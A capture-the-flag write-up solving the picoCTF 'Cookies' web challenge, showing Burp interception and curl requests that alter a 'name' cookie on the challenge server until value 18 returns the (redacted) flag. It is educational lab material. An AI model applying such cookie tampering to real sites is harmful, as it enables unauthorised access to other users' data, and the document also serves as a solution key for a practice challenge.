---
title: PicoCTF - Cookies
date: 2023-12-08
categories: [Challenges, Web Exploitation]
tags: [picoctf, web-exploitation, cookies, http-requests, burp-suite, curl]
img_path: /assets/picoctf/web_exploitation/cookies
published: true
---

![](cookie_banner.png){: width='60%' .normal}

Visiting the link:

![](home.png){: width='60%' }

Putting `snickerdoodle` as input results to:

![](snickerdoodle_cookie.png)

Intercepting the traffic with Burp and refreshing the page:

![](0_snickerdoodle.png)

We have a cookie called `name` set to value `0`. Playing around with different cookie values results to different responses, including the flag:

![](1_choc.png)

![](2_oat.png)

![](18_flag.jpg)

![](28_mac.png)

We can also do the same process using `curl`:

```shell
# getting the head info
curl http://mercury.picoctf.net:29649/ -I
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: http://mercury.picoctf.net:29649/
Set-Cookie: name=-1; Path=/
```

We can see there there is a cookie called `name` with the value of `-1`. We can set our own value and see what happens:

```shell
# setting cookie's value to 0
curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=0;" | grep -i Cookie
    <title>Cookies</title>
            <h3 class="text-muted">Cookies</h3>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>
```

```shell
# setting cookie's value to 1
curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=1;" | grep -i Cookie
    <title>Cookies</title>
            <h3 class="text-muted">Cookies</h3>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
```

```shell
# setting cookie's value to 18
curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=18;" | grep -i Cookie
    <title>Cookies</title>
            <h3 class="text-muted">Cookies</h3>
```

We notice that when the cookie to `name=18` it does not return any cookie back! We can inspect the full response:

```shell
# getting the full response back
curl -s http://mercury.picoctf.net:29649/check -H "Cookie: name=18;"
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{<SNIP>}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

</html>
```